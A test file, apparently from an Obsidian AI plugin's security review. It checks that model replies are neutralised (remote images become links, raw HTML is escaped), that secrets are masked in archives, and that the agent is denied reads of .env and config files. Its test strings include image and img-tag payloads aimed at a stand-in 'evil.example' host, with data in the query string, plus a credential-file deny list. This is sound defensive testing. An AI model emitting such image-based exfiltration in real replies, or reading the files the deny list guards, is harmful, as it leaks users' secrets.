/* UNTRUSTED OUTPUT AND SECRETS (plugin review, 2026-11-21).
 *
 * Three rules, each watched failing before the fix:
 *   1. A remote image in a model reply never reaches the renderer as an
 *      image: it becomes a link the member may click. Raw HTML is shown as
 *      text, except harmless bare formatting tags. Code is untouched.
 *   2. Secret-shaped strings are masked before any archive file is written.
 *   3. The agent may not read keys files (wherever they are) or the vault's
 *      config folder without asking; the rest of .icor-for-life stays readable.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  neutraliseUntrustedMarkdown as clean, isRemoteAddress, stripRemoteMedia,
  maskSecrets, maskSecretsDeep, secretReadDeny,
} from './build/pure.mjs';

test('a remote image becomes a link: nothing is fetched until the member clicks', () => {
  assert.equal(clean('see ![chart](https://evil.example/x.png?d=secret)'), 'see [image: chart](https://evil.example/x.png?d=secret)');
  assert.equal(clean('![](https://evil.example/?d=a%20b "t")'), '[image](https://evil.example/?d=a%20b "t")');
  assert.equal(clean('![x](//evil.example/p.gif)'), '[image: x](//evil.example/p.gif)');
  assert.equal(clean('![x][r]\n\n[r]: https://evil.example/p.gif'), '[image: x][r]\n\n[r]: https://evil.example/p.gif');
});

test('local images and Obsidian embeds stay images', () => {
  for (const md of ['![](Pictures/a.png)', '![a](app://local/x.png)', '![a](data:image/png;base64,AAAA)', '![[My diagram.png]]', '![a](<05 Assets/a b.png>)']) {
    assert.equal(clean(md), md, md);
  }
  assert.equal(isRemoteAddress('https://x.y'), true);
  assert.equal(isRemoteAddress('05 Assets/a.png'), false);
  assert.equal(isRemoteAddress('blob:abc'), false);
});

test('raw HTML is shown as text; bare formatting tags pass', () => {
  assert.equal(clean('<img src="https://evil.example/?d=1">'), '&lt;img src="https://evil.example/?d=1"&gt;');
  assert.equal(clean('<iframe src="https://x"></iframe>'), '&lt;iframe src="https://x"&gt;&lt;/iframe&gt;');
  assert.equal(clean('<div style="background:url(https://x)">hi</div>'), '&lt;div style="background:url(https://x)"&gt;hi&lt;/div&gt;');
  assert.equal(clean('<b onmouseover="x">bold</b>'), '&lt;b onmouseover="x"&gt;bold</b>', 'a safe tag with attributes is not safe');
  assert.equal(clean('Press <kbd>Ctrl</kbd>+<kbd>K</kbd><br>done'), 'Press <kbd>Ctrl</kbd>+<kbd>K</kbd><br>done');
  assert.equal(clean('a <!-- hidden --> b'), 'a &lt;!-- hidden --&gt; b');
  assert.equal(clean('2 < 3 and 5 > 4'), '2 < 3 and 5 > 4', 'comparisons are not tags');
});

test('code is never changed', () => {
  const fenced = '```html\n<img src="https://x/p.png">\n![a](https://x/a.png)\n```';
  assert.equal(clean(fenced), fenced);
  const tilde = '~~~\n<script>x</script>\n~~~';
  assert.equal(clean(tilde), tilde);
  assert.equal(clean('use `<img src="https://x">` or ``![a](https://x)``'), 'use `<img src="https://x">` or ``![a](https://x)``');
  assert.equal(clean('    <img src="https://x">'), '    <img src="https://x">', 'indented code');
  assert.equal(clean('```\nopen\n\n<img src="https://x">'), '```\nopen\n\n<img src="https://x">', 'an unclosed fence stays code');
});

test('the second wall removes remote media a renderer left behind', () => {
  const made = [];
  const el = (attrs) => {
    const e = { getAttribute: (n) => (n in attrs ? attrs[n] : null), remove() { this.gone = true; } };
    made.push(e); return e;
  };
  const nodes = [el({ src: 'https://evil.example/p.png' }), el({ src: 'app://local/a.png' }), el({ srcset: 'a.png 1x, https://evil/b.png 2x' }), el({ poster: '//evil/p.jpg' })];
  const removed = stripRemoteMedia({ querySelectorAll: () => nodes });
  assert.equal(removed, 3);
  assert.deepEqual(made.map((e) => !!e.gone), [true, false, true, true]);
});

test('the renderer is handed the neutralised text, and the second wall runs after it', () => {
  const src = readFileSync(new URL('../src/view/stream/StreamRenderer.ts', import.meta.url), 'utf8');
  assert.match(src, /MarkdownRenderer\.render\(this\.app, neutraliseUntrustedMarkdown\(source\), el, this\.sourcePath, this\.owner\);\s*stripRemoteMedia\(el\);/);
  assert.equal((src.match(/MarkdownRenderer\.render\(/g) || []).length, 1, 'no second, unguarded render');
});

test('secret-shaped strings are masked, ordinary text is not', () => {
  assert.equal(maskSecrets('key sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWX end'), 'key sk-ant…[masked] end');
  assert.equal(maskSecrets('ANTHROPIC_API_KEY=abcd1234efgh5678'), 'ANTHROPIC_API_KEY=abcd…[masked]');
  assert.equal(maskSecrets('TODOIST_TOKEN="0123456789abcdef"'), 'TODOIST_TOKEN="0123…[masked]"');
  assert.equal(maskSecrets('{"refresh_token": "rt_abcdefghijkl"}'), '{"refresh_token": "rt_a…[masked]"}');
  assert.equal(maskSecrets('Authorization: Bearer abcdefghijklmnop'), 'Authorization: Bearer abcd…[masked]');
  assert.equal(maskSecrets('token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123'), 'token ghp_AB…[masked]');
  for (const plain of ['The keyboard has a key.', 'password: short', 'Use the token budget wisely.', 'a sk-123 short']) {
    assert.equal(maskSecrets(plain), plain, plain);
  }
  const once = maskSecrets('API_KEY=abcd1234efgh5678');
  assert.equal(maskSecrets(once), once, 'masking twice changes nothing');
  assert.deepEqual(maskSecretsDeep({ a: ['x', 'SECRET=abcdefgh12345'], n: 3, b: null }), { a: ['x', 'SECRET=abcd…[masked]'], n: 3, b: null });
});

test('every archive file is masked on its way in', () => {
  const src = readFileSync(new URL('../src/archive/writer.ts', import.meta.url), 'utf8');
  assert.match(src, /maskSecrets\(renderConversation\(input, folder\)\)/);
  assert.match(src, /maskSecrets\(renderSubagent\(transcript\)\)/);
  assert.match(src, /maskSecretsDeep\(withoutImageBytes\(input\.events\)\)/);
});

test('the agent may not read keys files or the config folder unasked', () => {
  const rules = secretReadDeny('.obsidian');
  for (const tool of ['Read', 'Grep', 'Glob']) {
    for (const p of ['./.obsidian/**', '**/.env', '**/.env.*']) assert.ok(rules.includes(`${tool}(${p})`), `${tool}(${p})`);
  }
  assert.ok(!rules.some((r) => r.includes('.icor-for-life/**')), 'the schema in .icor-for-life stays readable (older vaults point the agent at it)');
  assert.ok(secretReadDeny('.my-config/').includes('Read(./.my-config/**)'), 'a renamed config folder is covered');
  assert.ok(!secretReadDeny(undefined).some((r) => r.includes('undefined')));
  const session = readFileSync(new URL('../src/provider/claude/session.ts', import.meta.url), 'utf8');
  assert.match(session, /options\.disallowedTools = secretReadDeny\(config\.configDir\);/);
});
